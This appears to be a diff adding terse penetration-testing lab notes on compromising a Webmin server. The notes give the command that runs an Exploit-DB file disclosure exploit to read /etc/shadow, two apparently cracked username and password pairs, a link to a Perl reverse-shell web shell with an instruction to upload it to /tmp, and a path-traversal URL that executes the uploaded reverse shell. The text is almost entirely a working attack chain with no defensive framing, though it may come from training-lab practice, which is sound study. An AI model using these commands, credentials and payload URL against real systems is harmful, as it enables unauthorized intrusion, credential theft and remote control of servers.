@@ -1,0 +1,12 @@
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP) - https://www.exploit-db.com/exploits/1997
+
+php 1997.php 10.11.1.141 10000 http /etc/shadow
+
+alice:loading1
+bob:BUGZBUNNY
+
+http://pentestmonkey.net/tools/web-shells/perl-reverse-shell
+
+upload in /tmp
+
+http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/tmp/reverse-shell.cgi
